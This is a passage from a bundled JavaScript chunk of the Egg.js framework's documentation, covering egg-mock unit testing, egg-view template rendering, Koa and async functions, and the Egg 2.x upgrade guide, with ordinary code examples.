    const lang = this.ctx.get('Accept-Language');
    if (lang.includes('zh-CN')) {
      return \`\uFFE5 \${val}\`;
    }
    return \`$ \${val}\`;
  },
};
`,paraId:99,tocIndex:22},{value:"A corresponding test:",paraId:100,tocIndex:22},{value:`describe('money()', () => {
  it('should RMB', () => {
    const ctx = app.mockContext({
      // mock headers of ctx
      headers: {
        'Accept-Language': 'zh-CN,zh;q=0.5',
      },
    });
    assert(ctx.helper.money(100) === '\uFFE5 100');
  });

  it('should US Dolar', () => {
    const ctx = app.mockContext();
    assert(ctx.helper.money(100) === '$ 100');
  });
});
`,paraId:101,tocIndex:22},{value:"Except functions mentioned above, like ",paraId:102,tocIndex:23},{value:"app.mockContext()",paraId:102,tocIndex:23},{value:" and ",paraId:102,tocIndex:23},{value:"app.mockCsrf()",paraId:102,tocIndex:23},{value:", egg-mock provides ",paraId:102,tocIndex:23},{value:"quite a few mocking functions",paraId:102,tocIndex:23},{value:" to make writing tests easier.",paraId:102,tocIndex:23},{value:"To prevent console logs through ",paraId:103,tocIndex:23},{value:"mock.consoleLevel('NONE')",paraId:103,tocIndex:23},{value:"To mock session data through ",paraId:103,tocIndex:23},{value:"app.mockSession(data)",paraId:103,tocIndex:23},{value:`describe('GET /session', () => {
  it('should mock session work', () => {
    app.mockSession({
      foo: 'bar',
      uid: 123,
    });
    return app
      .httpRequest()
      .get('/session')
      .expect(200)
      .expect({
        session: {
          foo: 'bar',
          uid: 123,
        },
      });
  });
});
`,paraId:104,tocIndex:23},{value:"Remember to restore mock data in an ",paraId:105,tocIndex:23},{value:"afterEach",paraId:105,tocIndex:23},{value:" hook, otherwise it would take effect with all the tests that supposed to be independent to each other.",paraId:105,tocIndex:23},{value:`describe('some test', () => {
  // before hook

  afterEach(mock.restore);

  // it tests
});
`,paraId:106,tocIndex:23},{value:"When you use ",paraId:107,tocIndex:23},{value:"egg-mock/bootstrap",paraId:107,tocIndex:23},{value:", resetting work would be done automatically in an ",paraId:107,tocIndex:23},{value:"afterEach",paraId:107,tocIndex:23},{value:" hook, Do not need to write these code any more.",paraId:107,tocIndex:23},{value:"The following will describe the common usage of egg-mock.",paraId:108,tocIndex:23},{value:"Egg-mock is extended from ",paraId:109,tocIndex:24},{value:"mm",paraId:109,tocIndex:24},{value:" module which contains full features of mm, so we can directly mock any objects' properties and functions.",paraId:109,tocIndex:24},{value:"Mock ",paraId:110,tocIndex:25},{value:"app.config.baseDir",paraId:110,tocIndex:25},{value:" to return a given value - ",paraId:110,tocIndex:25},{value:"/tmp/mockapp",paraId:110,tocIndex:25},{value:".",paraId:110,tocIndex:25},{value:`mock(app.config, 'baseDir', '/tmp/mockapp');
assert(app.config.baseDir === '/tmp/mockapp');
`,paraId:111,tocIndex:25},{value:"Mock ",paraId:112,tocIndex:26},{value:"fs.readFileSync",paraId:112,tocIndex:26},{value:" to return a given function.",paraId:112,tocIndex:26},{value:`mock(fs, 'readFileSync', (filename) => {
  return 'hello world';
});
assert(fs.readFileSync('foo.txt') === 'hello world');
`,paraId:113,tocIndex:26},{value:"See more detail in ",paraId:114,tocIndex:26},{value:"mm API",paraId:114,tocIndex:26},{value:", include advanced usage like ",paraId:114,tocIndex:26},{value:"mock.data()",paraId:114,tocIndex:26},{value:"\uFF0C",paraId:114,tocIndex:26},{value:"mock.error()",paraId:114,tocIndex:26},{value:" and so on.",paraId:114,tocIndex:26},{value:"Service is a standard built-in member of the framework, ",paraId:115,tocIndex:27},{value:"app.mockService(service, methodName, fn)",paraId:115,tocIndex:27},{value:" is offered to conveniently mock its result.",paraId:115,tocIndex:27},{value:"For example, mock the method ",paraId:116,tocIndex:27},{value:"get(name)",paraId:116,tocIndex:27},{value:" in ",paraId:116,tocIndex:27},{value:"app/service/user",paraId:116,tocIndex:27},{value:" to return a nonexistent user.",paraId:116,tocIndex:27},{value:`it('should mock fengmk1 exists', () => {
  app.mockService('user', 'get', () => {
    return {
      name: 'fengmk1',
    };
  });

  return (
    app
      .httpRequest()
      .get('/user?name=fengmk1')
      .expect(200)
      // return an originally nonexistent user
      .expect({
        name: 'fengmk1',
      })
  );
});
`,paraId:117,tocIndex:27},{value:"Using ",paraId:118,tocIndex:27},{value:"app.mockServiceError(service, methodName, error)",paraId:118,tocIndex:27},{value:" to mock exception.",paraId:118,tocIndex:27},{value:"For example, mock the method ",paraId:119,tocIndex:27},{value:"get(name)",paraId:119,tocIndex:27},{value:" in ",paraId:119,tocIndex:27},{value:"app/service/user",paraId:119,tocIndex:27},{value:" to throw an exception.",paraId:119,tocIndex:27},{value:`it('should mock service error', () => {
  app.mockServiceError('user', 'get', 'mock user service error');
  return (
    app
      .httpRequest()
      .get('/user?name=fengmk2')
      // service exception causing the 500 status code
      .expect(500)
      .expect(/mock user service error/)
  );
});
`,paraId:120,tocIndex:27},{value:"External HTTP requests should be performed though ",paraId:121,tocIndex:28},{value:"HttpClient",paraId:122,tocIndex:28},{value:", a built-in member of Egg, and ",paraId:121,tocIndex:28},{value:"app.mockHttpclient(url, method, data)",paraId:121,tocIndex:28},{value:" is able to simulate various network exceptions of requests performed by ",paraId:121,tocIndex:28},{value:"app.curl",paraId:121,tocIndex:28},{value:" and ",paraId:121,tocIndex:28},{value:"ctx.curl",paraId:121,tocIndex:28},{value:".",paraId:121,tocIndex:28},{value:"For example, we submit a request in ",paraId:123,tocIndex:28},{value:"app/controller/home.js",paraId:123,tocIndex:28},{value:".",paraId:123,tocIndex:28},{value:`class HomeController extends Controller {
  async httpclient() {
    const res = await this.ctx.curl('https://eggjs.org');
    this.ctx.body = res.data.toString();
  }
}
`,paraId:124,tocIndex:28},{value:"Then mock it's response.",paraId:125,tocIndex:28},{value:`describe('GET /httpclient', () => {
  it('should mock httpclient response', () => {
    app.mockHttpclient('https://eggjs.org', {
      // parameter allowed to be a buffer / string / json,
      // will be finally converted to buffer
      // according to options.dataType
      data: 'mock eggjs.org response',
    });
    return app
      .httpRequest()
      .get('/httpclient')
      .expect('mock eggjs.org response');
  });
});
`,paraId:126,tocIndex:28},{value:"All sample code can be found in ",paraId:127,tocIndex:29},{value:"eggjs/exmaples/unittest",paraId:127,tocIndex:29}]},11653:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(29600);const t=[{value:`In most cases, we need to fetch data and render with template files.
So we need to use corresponding view engines.`,paraId:0},{value:"egg-view",paraId:1},{value:` is a built-in plugin to support using multiple view engines in one application.
All view engines are imported as plugins.
With `,paraId:1},{value:"egg-view",paraId:1},{value:` developers can use the same API interface to work with different view engines.
See `,paraId:1},{value:"View Plugin",paraId:2},{value:" for more details.",paraId:1},{value:"Take the officially supported View plugin ",paraId:3},{value:"egg-view-nunjucks",paraId:3},{value:" as an example:",paraId:3},{value:`$ npm i egg-view-nunjucks --save
`,paraId:4,tocIndex:0},{value:`// config/plugin.js
exports.nunjucks = {
  enable: true,
  package: 'egg-view-nunjucks',
};
`,paraId:5,tocIndex:1},{value:"egg-view",paraId:6,tocIndex:2},{value:" defines the default configuration of ",paraId:6,tocIndex:2},{value:"config.view",paraId:6,tocIndex:2},{value:"Root directory for template files is absolute path, with default value ",paraId:7,tocIndex:3},{value:"${baseDir}/app/view",paraId:7,tocIndex:3},{value:".",paraId:7,tocIndex:3},{value:"egg-view",paraId:8,tocIndex:3},{value:" supports having multiple directories, which are separated by ",paraId:8,tocIndex:3},{value:",",paraId:8,tocIndex:3},{value:`.
In this case, it looks for template files from all the directories.`,paraId:8,tocIndex:3},{value:"The configuration below is an example of multiple view directories:",paraId:9,tocIndex:3},{value:`// config/config.default.js
const path = require('path');
module.exports = (appInfo) => {
  const config = {};
  config.view = {
    root: [
      path.join(appInfo.baseDir, 'app/view'),
      path.join(appInfo.baseDir, 'path/to/another'),
    ].join(','),
  };
  return config;
};
`,paraId:10,tocIndex:3},{value:"Cache template file paths, default value is ",paraId:11,tocIndex:4},{value:"true",paraId:11,tocIndex:4},{value:`.
`,paraId:11,tocIndex:4},{value:"egg-view",paraId:11,tocIndex:4},{value:" looks for template files from the directories that defined in ",paraId:11,tocIndex:4},{value:"root",paraId:11,tocIndex:4},{value:`.
When a file matching given template path is found, the file's full path will be cached
and reused afterward.
`,paraId:11,tocIndex:4},{value:"egg-view",paraId:11,tocIndex:4},{value:" won't search all directories again for the same template path.",paraId:11,tocIndex:4},{value:"mapping",paraId:12},{value:"defaultViewEngine",paraId:12},{value:`Every view engine has a view engine name defined when the plugin is enabled.
In view configuration, `,paraId:13,tocIndex:5},{value:"mapping",paraId:13,tocIndex:5},{value:` defines the mapping
from template file's extension name to view engine name.
For example, use Nunjucks engine to render `,paraId:13,tocIndex:5},{value:".nj",paraId:13,tocIndex:5},{value:" files.",paraId:13,tocIndex:5},{value:`module.exports = {
  view: {
    mapping: {
      '.nj': 'nunjucks',
    },
  },
};
`,paraId:14,tocIndex:5},{value:"egg-view",paraId:15,tocIndex:5},{value:" uses the corresponding view engine according to the configuration above.",paraId:15,tocIndex:5},{value:`await ctx.render('home.nj');
`,paraId:16,tocIndex:5},{value:`The mapping from file extension name to view engine must be defined.
Otherwise `,paraId:17,tocIndex:5},{value:"egg-view",paraId:17,tocIndex:5},{value:` cannot find correct view engine.
Global configuration can be done with `,paraId:17,tocIndex:5},{value:"defaultViewEngine",paraId:17,tocIndex:5},{value:".",paraId:17,tocIndex:5},{value:`// config/config.default.js
module.exports = {
  view: {
    defaultViewEngine: 'nunjucks',
  },
};
`,paraId:18,tocIndex:5},{value:`If a view engine cannot be found according to specified mapping,
the default view engine will be used.
For the applications that use only one view engine,
it's recommended to set this option.`,paraId:19,tocIndex:5},{value:"defaultExtension",paraId:12},{value:"When calling ",paraId:20,tocIndex:6},{value:"render()",paraId:20,tocIndex:6},{value:`, the first argument should contain file extension name,
unless `,paraId:20,tocIndex:6},{value:"defaultExtension",paraId:20,tocIndex:6},{value:" has been configured.",paraId:20,tocIndex:6},{value:`// config/config.default.js
module.exports = {
  view: {
    defaultExtension: '.nj',
  },
};

// render app/view/home.nj
await ctx.render('home');
`,paraId:21,tocIndex:6},{value:"egg-view",paraId:22,tocIndex:7},{value:` provides three interfaces in Context.
All three returns a Promise:`,paraId:22,tocIndex:7},{value:"render(name, locals)",paraId:23,tocIndex:7},{value:" renders template file, and set the value to ",paraId:23,tocIndex:7},{value:"ctx.body",paraId:23,tocIndex:7},{value:".",paraId:23,tocIndex:7},{value:"renderView(name, locals)",paraId:23,tocIndex:7},{value:" renders template file, returns the result and don't set the value to any variable.",paraId:23,tocIndex:7},{value:"renderString(tpl, locals)",paraId:23,tocIndex:7},{value:" renders template string, returns the result and don't set the value to any variable.",paraId:23,tocIndex:7},{value:`// {app_root}/app/controller/home.js
class HomeController extends Controller {
  async index() {
    const data = { name: 'egg' };

    // render a template, path relate to \`app/view\`
    await ctx.render('home/index.tpl', data);

    // or manually set render result to ctx.body
    ctx.body = await ctx.renderView('path/to/file.tpl', data);

    // or render string directly
    ctx.body = await ctx.renderString('hi, {{ name }}', data, {
      viewEngine: 'nunjucks',
    });
  }
}
`,paraId:24,tocIndex:7},{value:"When calling ",paraId:25,tocIndex:7},{value:"renderString",paraId:25,tocIndex:7},{value:", view engine should be specified unless ",paraId:25,tocIndex:7},{value:"defaultViewEngine",paraId:25,tocIndex:7},{value:" has been defined.",paraId:25,tocIndex:7},{value:"locals",paraId:12},{value:"In the process of rendering pages, we usually need a variable to contain all information that is used in view template. ",paraId:26,tocIndex:8},{value:"egg-view",paraId:26,tocIndex:8},{value:" provides ",paraId:26,tocIndex:8},{value:"app.locals",paraId:26,tocIndex:8},{value:" and ",paraId:26,tocIndex:8},{value:"ctx.locals",paraId:26,tocIndex:8},{value:".",paraId:26,tocIndex:8},{value:"app.locals",paraId:27,tocIndex:8},{value:" is global, usually configured in ",paraId:27,tocIndex:8},{value:"app.js",paraId:27,tocIndex:8},{value:".",paraId:27,tocIndex:8},{value:"ctx.locals",paraId:27,tocIndex:8},{value:" is per-request, and it merges ",paraId:27,tocIndex:8},{value:"app.locals",paraId:27,tocIndex:8},{value:".",paraId:27,tocIndex:8},{value:"ctx.locals",paraId:27,tocIndex:8},{value:" can be assigned by modifying key/value or assigned with a new object. ",paraId:27,tocIndex:8},{value:"egg-view",paraId:27,tocIndex:8},{value:" will merge the new object automatically in corresponding setter.",paraId:27,tocIndex:8},{value:"// `app.locals` merged into `ctx.locals`\nctx.app.locals = { a: 1 };\nctx.locals.b = 2;\nconsole.log(ctx.locals); // { a: 1, b: 2 }\n\n// in the processing of a request, `app.locals` is merged into `ctx.locals` only at the first time `ctx.locals` being accessed\nctx.app.locals = { a: 2 };\nconsole.log(ctx.locals); // already merged before, so output is still { a: 1, b: 2 }\n\n// pass a new object to `locals`. New object will be merged into `locals`, instead of replacing it. It's done by setter automatically.\nctx.locals.c = 3;\nctx.locals = { d: 4 };\nconsole.log(ctx.locals); // { a: 1, b: 2, c: 3, d: 4 }\n",paraId:28,tocIndex:8},{value:`In practical development, we usually don't use these two objects in controller directly.
Instead, simply call `,paraId:29,tocIndex:8},{value:"ctx.render(name, data)",paraId:29,tocIndex:8},{value:":",paraId:29,tocIndex:8},{value:"egg-view",paraId:30,tocIndex:8},{value:" merges ",paraId:30,tocIndex:8},{value:"data",paraId:30,tocIndex:8},{value:" into ",paraId:30,tocIndex:8},{value:"ctx.locals",paraId:30,tocIndex:8},{value:" automatically.",paraId:30,tocIndex:8},{value:"egg-view",paraId:30,tocIndex:8},{value:" injects ",paraId:30,tocIndex:8},{value:"ctx",paraId:30,tocIndex:8},{value:", ",paraId:30,tocIndex:8},{value:"request",paraId:30,tocIndex:8},{value:", ",paraId:30,tocIndex:8},{value:"helper",paraId:30,tocIndex:8},{value:" into locals automatically.",paraId:30,tocIndex:8},{value:`ctx.app.locals = { appName: 'showcase' };
const data = { name: 'egg' };

// will auto merge \`data\` to \`ctx.locals\`, output: egg - showcase
await ctx.renderString('{{ name }} - {{ appName }}', data);

// helper, ctx, request will auto inject
await ctx.renderString(
  '{{ name }} - {{ helper.lowercaseFirst(ctx.app.config.baseDir) }}',
  data,
);
`,paraId:31,tocIndex:8},{value:"Note:",paraId:32,tocIndex:8},{value:"ctx.locals is cached. app.locals is merged into it only at the first time that ctx.locals is accessed.",paraId:33,tocIndex:8},{value:"due to the ambiguity of naming, the ",paraId:33,tocIndex:8},{value:"ctx.state",paraId:33,tocIndex:8},{value:" that is used in Koa is replaced by ",paraId:33,tocIndex:8},{value:"ctx.locals",paraId:33,tocIndex:8},{value:" in Egg.js, i.e. ",paraId:33,tocIndex:8},{value:"ctx.state",paraId:33,tocIndex:8},{value:" and ",paraId:33,tocIndex:8},{value:"ctx.locals",paraId:33,tocIndex:8},{value:" are equivalent. It's recommended to use the latter.",paraId:33,tocIndex:8},{value:"All functions that defined in ",paraId:34,tocIndex:9},{value:"helper",paraId:34,tocIndex:9},{value:` can be directly used in templates.
See `,paraId:34,tocIndex:9},{value:"Extend",paraId:35,tocIndex:9},{value:" for more details.",paraId:34,tocIndex:9},{value:`// app/extend/helper.js
exports.lowercaseFirst = (str) => str[0].toLowerCase() + str.substring(1);

// app/controller/home.js
await ctx.renderString('{{ helper.lowercaseFirst(name) }}', data);
`,paraId:36,tocIndex:9},{value:"The built-in plugin ",paraId:37,tocIndex:10},{value:"egg-security",paraId:37,tocIndex:10},{value:" provides common security helper functions, including ",paraId:37,tocIndex:10},{value:"helper.shtml / surl / sjs",paraId:37,tocIndex:10},{value:" and so on. It's strongly recommended to read ",paraId:37,tocIndex:10},{value:"Security",paraId:38,tocIndex:10},{value:".",paraId:37,tocIndex:10}]},50322:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(95800);const t=[]},39606:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(92982);const t=[{value:"Node.js is an asynchronous world, asynchronous programming models in official API support are all in callback form\uFF0Cit brings many problems. For example:",paraId:0,tocIndex:0},{value:"callback hell",paraId:1,tocIndex:0},{value:': Notorious "callback hell"\u3002',paraId:1,tocIndex:0},{value:"release zalgo",paraId:1,tocIndex:0},{value:": Asynchronous functions may call callback function response data synchronously which would bring inconsistency.",paraId:1,tocIndex:0},{value:"The community has provided many solutions for the problems and the winner is Promise. It is built into ECMAScript 2015. On the basis of Promise, and with the ability of Generator to switch context, we can write asynchronous code in a synchronous way with ",paraId:2,tocIndex:0},{value:"co",paraId:2,tocIndex:0},{value:" and other third-party libraries. Meanwhile ",paraId:2,tocIndex:0},{value:"async function",paraId:2,tocIndex:0},{value:", the official solution has been published in ECMAScript 2017 and landed in Node.js 8.",paraId:2,tocIndex:0},{value:"Async function",paraId:3,tocIndex:1},{value:" is a syntactic sugar at the language level. In async function, we can use ",paraId:3,tocIndex:1},{value:"await",paraId:3,tocIndex:1},{value:" to wait for a promise to be resolved(or rejected, which will throw an exception), and Node.js LTS (8.x) has supported this feature.",paraId:3,tocIndex:1},{value:`const fn = async function () {
  const user = await getUser();
  const posts = await fetchPosts(user.id);
  return { user, posts };
};
fn()
  .then((res) => console.log(res))
  .catch((err) => console.error(err.stack));
`,paraId:4,tocIndex:1},{value:"Koa",paraId:5,tocIndex:2},{value:" is a new Web framework designed by the team behind Express, which aims to be a smaller, more expressive, and more robust foundation for Web applications and APIs.",paraId:5,tocIndex:2},{value:"The design styles of Koa and Express are very similar, The underlying basic library is the same, ",paraId:6,tocIndex:2},{value:"HTTP library",paraId:6,tocIndex:2},{value:". There are several significant differences between them. Besides the asynchronous solution by default mentioned above, there are the following points.",paraId:6,tocIndex:2},{value:"The middleware in Koa is different from Express, Koa use the onion model:",paraId:7,tocIndex:3},{value:"Middleware onion diagram:",paraId:8,tocIndex:3},{value:"Middleware execution sequence diagram:",paraId:9,tocIndex:3},{value:"All the requests will be executed twice during one middleware. Compared to Express middleware, it is very easy to implement post-processing logic. You can obviously feel the advantage of Koa middleware model by comparing the compress middleware implementatio in Koa and Express.",paraId:10,tocIndex:3},{value:"koa-compress",paraId:11,tocIndex:3},{value:" for Koa.",paraId:11,tocIndex:3},{value:"compression",paraId:11,tocIndex:3},{value:" for Express.",paraId:11,tocIndex:3},{value:"Unlike that there are only two objects ",paraId:12,tocIndex:4},{value:"Request",paraId:12,tocIndex:4},{value:" and ",paraId:12,tocIndex:4},{value:"Response",paraId:12,tocIndex:4},{value:" in Express, Koa has one more, ",paraId:12,tocIndex:4},{value:"Context",paraId:12,tocIndex:4},{value:" object in one HTTP request(it is ",paraId:12,tocIndex:4},{value:"this",paraId:12,tocIndex:4},{value:" in Koa 1, while it is the first parameter for middleware function in Koa 2). We can mount all the related properties in one request to this object. Such as ",paraId:12,tocIndex:4},{value:"traceId",paraId:12,tocIndex:4},{value:" that runs through the whole request lifetime (which will be called anywhere afterward) could be mounted. It is more semantic other than request and response.",paraId:12,tocIndex:4},{value:"At the same time Request and Response are mounted to the Context object. Just like Express, the two objects provide lots of easy ways to help developing. For example:",paraId:13,tocIndex:4},{value:"get request.query",paraId:14,tocIndex:4},{value:"get request.hostname",paraId:14,tocIndex:4},{value:"set response.body",paraId:14,tocIndex:4},{value:"set response.status",paraId:14,tocIndex:4},{value:"Another enormous advantage for writing asynchronous code in a synchronous way is that it is quite easy to handle the exception. You can catch all the exceptions thrown in the codes followed the convention with ",paraId:15,tocIndex:5},{value:"try catch",paraId:15,tocIndex:5},{value:". We can easily write a customized exception handling middleware.",paraId:15,tocIndex:5},{value:`async function onerror(ctx, next) {
  try {
    await next();
  } catch (err) {
    ctx.app.emit('error', err);
    ctx.body = 'server error';
    ctx.status = err.status || 500;
  }
}
`,paraId:16,tocIndex:5},{value:"Putting this middleware before others, you can catch all the exceptions thrown by the synchronous or asynchronous code.",paraId:17,tocIndex:5},{value:"As described above, Koa is an excellent framework. However, it is not enough to build an enterprise-class application.",paraId:18,tocIndex:6},{value:"Egg is built around the Koa. On the basis of Koa model, Egg implements enhancements one step further.",paraId:19,tocIndex:6},{value:"In the framework or application based on Egg, we can extend the prototype of 4 Koa objects by defining ",paraId:20,tocIndex:7},{value:"app/extend/{application,context,request,response}.js",paraId:20,tocIndex:7},{value:". With this, we can write more utility methods quickly. For example, we have the following code in ",paraId:20,tocIndex:7},{value:"app/extend/context.js",paraId:20,tocIndex:7},{value:":",paraId:20,tocIndex:7},{value:`// app/extend/context.js
module.exports = {
  get isIOS() {
    const iosReg = /iphone|ipad|ipod/i;
    return iosReg.test(this.get('user-agent'));
  },
};
`,paraId:21,tocIndex:7},{value:"It can be used in controller then:",paraId:22,tocIndex:7},{value:`// app/controller/home.js
exports.handler = (ctx) => {
  ctx.body = ctx.isIOS
    ? 'Your operating system is iOS.'
    : 'Your operating system is not iOS.';
};
`,paraId:23,tocIndex:7},{value:"More about extension, please check ",paraId:24,tocIndex:7},{value:"Exception",paraId:25,tocIndex:7},{value:" section.",paraId:24,tocIndex:7},{value:"As is known to all, Many middlewares are imported to provide different kinds of features in Express and Koa. Eg, ",paraId:26,tocIndex:8},{value:"koa-session",paraId:26,tocIndex:8},{value:" provides the Session support, ",paraId:26,tocIndex:8},{value:"koa-bodyparser",paraId:26,tocIndex:8},{value:" help to parse request body. Egg has provided a powerful plugin mechanism to make it easier to write stand-alone features.",paraId:26,tocIndex:8},{value:"One plugin can include:",paraId:27,tocIndex:8},{value:"extend\uFF1Aextend the context of base object, provide utility and attributes.",paraId:28,tocIndex:8},{value:"middleware\uFF1Aadd one or more middlewares, provide pre or post-processing logic for request.",paraId:28,tocIndex:8},{value:"config\uFF1Aconfigure the default value in different environments.",paraId:28,tocIndex:8},{value:"A stand-alone module plugin can provide rich features with high maintainability. You can almost forget the configuration as the plugin supports configuring the default value in different environments.",paraId:29,tocIndex:8},{value:"egg-security",paraId:30,tocIndex:8},{value:" is a typical example.",paraId:30,tocIndex:8},{value:"More about plugin, please check ",paraId:31,tocIndex:8},{value:"Plugin",paraId:32,tocIndex:8},{value:" section.",paraId:31,tocIndex:8},{value:"When Egg 1.x released, the Node.js LTS version did not support async function\uFF0Cso Egg 1.x was based on Koa 1.x. On the basis of this, Egg had added fully async function support. Egg is completely compatible with middlewares in Koa 2.x, all applications could write with ",paraId:33,tocIndex:10},{value:"async function",paraId:33,tocIndex:10},{value:".",paraId:33,tocIndex:10},{value:"The underlying is based on Koa 1.x, asynchronous solution is based on the generator function wrapped by ",paraId:34,tocIndex:10},{value:"co",paraId:34,tocIndex:10},{value:".",paraId:34,tocIndex:10},{value:"Official plugin and the core of Egg are written in generator function, keep supporting Node.js LTS version, use ",paraId:34,tocIndex:10},{value:"co",paraId:34,tocIndex:10},{value:" when necessary to be compatible with async function.",paraId:34,tocIndex:10},{value:"Application developers can choose either async function (Node.js 8.x+) or generator function (Node.js 6.x+).",paraId:34,tocIndex:10},{value:"When Node.js 8 became LTS version, an async function could be used in Node.js without any performance problem. Egg released 2.x based on Koa 2.x, the framework and built-in plugins were all written by async function, and Egg 2.x still kept compatibility with generator function and all the usages in Egg 1.x, applications based on Egg 1.x can migrate to Egg 2.x only by upgrading to Node.js 8.",paraId:35,tocIndex:11},{value:"The underlying will be based on Koa 2.x, the asynchronous solution will be based on async function.",paraId:36,tocIndex:11},{value:"The official plugin and core of egg will be written in an async function.",paraId:36,tocIndex:11},{value:"Recommend the user to transfer the business layer to async function.",paraId:36,tocIndex:11},{value:"Only support Node.js 8+.",paraId:36,tocIndex:11}]},13079:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(64372);const t=[{value:"Egg is born for building enterprise application and framework",paraId:0},{value:"\uFF0Cwe hope Egg will give birth to more application framework to help developers and developing teams reduce development and maintenance costs.",paraId:0},{value:"Since we know well that enterprise applications need to consider how to balance the differences between different teams, seeking common ground while reserving differences in the pursuit of clarifying specification and cooperation, we focus on providing core features for Web development and a flexible and extensible plugin mechanism instead of giant bazaar mode which is popular in common Web frameworks (with integrated such as database, template engine, front-end framework and other functions). We will not make a technical selection because default technical selection makes the scalability of the framework too poor to meet a variety of custom requirements. With the help of Egg, it is very easy for architects and technical leaders to build their own framework which is suitable for their business scenarios based on the existing technology stack .",paraId:1,tocIndex:0},{value:"The plugin mechanism of Egg is very extensible, ",paraId:2,tocIndex:0},{value:"one purpose for one plugin",paraId:2,tocIndex:0},{value:"(Eg: ",paraId:2,tocIndex:0},{value:"Nunjucks",paraId:2,tocIndex:0},{value:" is encapsulated into ",paraId:2,tocIndex:0},{value:"egg-view-nunjucks",paraId:2,tocIndex:0},{value:", and MySQL is encapsulated into ",paraId:2,tocIndex:0},{value:"egg-mysql",paraId:2,tocIndex:0},{value:"). Aggregating the plugins and customizing the configurations according to their own business scenarios greatly reduces the development cost.",paraId:2,tocIndex:0},{value:"Egg is a convention-over-configuration framework, follows the ",paraId:3,tocIndex:0},{value:"Loader",paraId:4,tocIndex:0},{value:" to do the development, it helps to reduce the cost of learning. Developers no longer work as 'nails'. The cost of communication is very high for a team without convention. It is easy to get fault without convention. However convention is not equal to difficult extension, instead, Egg does well in extension part, you can build your own framework according to team convention. ",paraId:3,tocIndex:0},{value:"Loader",paraId:5,tocIndex:0},{value:" can help load different default configuration in a different environment, Egg default convention can also be covered by your own.",paraId:3,tocIndex:0},{value:"Express",paraId:6,tocIndex:1},{value:" is well used in the Node.js community, it is easy and extensible, fits personal projects a lot. However, without default convention, the standard mvc model has lots of strange impl which would lead to misunderstandings. Egg's teamwork cost is really low by following convention convention-over-configuration.",paraId:6,tocIndex:1},{value:"Sails",paraId:7,tocIndex:1},{value:" is a framework that also follows convention-over-configuration,it does well in extensible work. Compared with Egg, ",paraId:7,tocIndex:1},{value:"Sails",paraId:7,tocIndex:1},{value:" supports blueprint REST API, ",paraId:7,tocIndex:1},{value:"WaterLine",paraId:7,tocIndex:1},{value:" , Frontend integration, WebSocket and so on, all of these are provided by ",paraId:7,tocIndex:1},{value:"Sails",paraId:7,tocIndex:1},{value:". Egg does not provide these functions, it only has the integration of different functional extensions, such as egg-blueprint, egg-waterline, if you use sails-egg to integrate these extensions, ",paraId:7,tocIndex:1},{value:"Sails",paraId:7,tocIndex:1},{value:" can be replaced.",paraId:7,tocIndex:1},{value:"Provide capability to ",paraId:8,tocIndex:2},{value:"customizd framework",paraId:9,tocIndex:2},{value:" base on Egg",paraId:8,tocIndex:2},{value:"Highly extensible ",paraId:8,tocIndex:2},{value:"plugin mechanism",paraId:10,tocIndex:2},{value:"Built-in ",paraId:8,tocIndex:2},{value:"cluster",paraId:11,tocIndex:2},{value:"Based on ",paraId:8,tocIndex:2},{value:"Koa",paraId:8,tocIndex:2},{value:" with high performance",paraId:8,tocIndex:2},{value:"Stable core framework with high test coverage",paraId:8,tocIndex:2},{value:"Progressive development",paraId:12,tocIndex:2}]},33230:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(669);const t=[{value:"With the official release of Node.js 8 LTS, egg now comes with built-in ES2017 Async Function support.",paraId:0,tocIndex:0},{value:"Though the TJ ",paraId:1,tocIndex:0},{value:"co",paraId:1,tocIndex:0},{value:" has brought ",paraId:1,tocIndex:0},{value:"async/await",paraId:1,tocIndex:0},{value:" programming experience before this, but it also has some inevitable problems:",paraId:1,tocIndex:0},{value:"performance lost",paraId:2,tocIndex:0},{value:"obscure error logs",paraId:2,tocIndex:0},{value:"In the official Egg 2.x:",paraId:3,tocIndex:0},{value:"Full compatibility to Egg 1.x and ",paraId:4,tocIndex:0},{value:"generator function",paraId:4,tocIndex:0},{value:".",paraId:4,tocIndex:0},{value:"Koa 2.x based ",paraId:4,tocIndex:0},{value:"async function",paraId:4,tocIndex:0},{value:" solutions.",paraId:4,tocIndex:0},{value:"Only support Node.js 8 and above.",paraId:4,tocIndex:0},{value:"Better error stack messages without ",paraId:4,tocIndex:0},{value:"co",paraId:4,tocIndex:0},{value:", approximately 30% performance improvement (do not include the performance improvement brought by Node), see ",paraId:4,tocIndex:0},{value:"benchmark",paraId:4,tocIndex:0},{value:" for more details.",paraId:4,tocIndex:0},{value:"One of the Egg's concept is ",paraId:5,tocIndex:0},{value:"progressive",paraId:5,tocIndex:0},{value:", hence we provide progressive programming experiences to developers.",paraId:5,tocIndex:0},{value:"Quick upgrade",paraId:6,tocIndex:0},{value:"Plugin update",paraId:7,tocIndex:0},{value:"Further upgrade",paraId:8,tocIndex:0},{value:"Upgrade documents for Plugin developers",paraId:9,tocIndex:0},{value:"Use the latest Node LTS version (",paraId:10,tocIndex:1},{value:">=8.9.0",paraId:10,tocIndex:1},{value:").",paraId:10,tocIndex:1},{value:"Change ",paraId:10,tocIndex:1},{value:"egg",paraId:10,tocIndex:1},{value:" version to ",paraId:10,tocIndex:1},{value:"^2.0.0",paraId:10,tocIndex:1},{value:" in ",paraId:10,tocIndex:1},{value:"package.json",paraId:10,tocIndex:1},{value:".",paraId:10,tocIndex:1},{value:"Check if included plugins are the latest version (optional).",paraId:10,tocIndex:1},{value:"Reinstall the dependencies, and run unit tests again.",paraId:10,tocIndex:1},{value:"Done! Barely with any code changes",paraId:11,tocIndex:1},{value:"yield parts",paraId:12,tocIndex:3},{value:" needs to change to ",paraId:12,tocIndex:3},{value:"await parts()",paraId:12,tocIndex:3},{value:" or ",paraId:12,tocIndex:3},{value:"yield parts()",paraId:12,tocIndex:3},{value:`// old
const parts = ctx.multipart();
while ((part = yield parts) != null) {
  // do something
}

// yield parts() also work
while ((part = yield parts()) != null) {
  // do something
}

// new
const parts = ctx.multipart();
while ((part = await parts()) != null) {
  // do something
}
`,paraId:13,tocIndex:3},{value:"egg-multipart#upload-multiple-files",paraId:14,tocIndex:3},{value:`DO NOT support 1.x role definition, because koa-roles is no longer compatible.
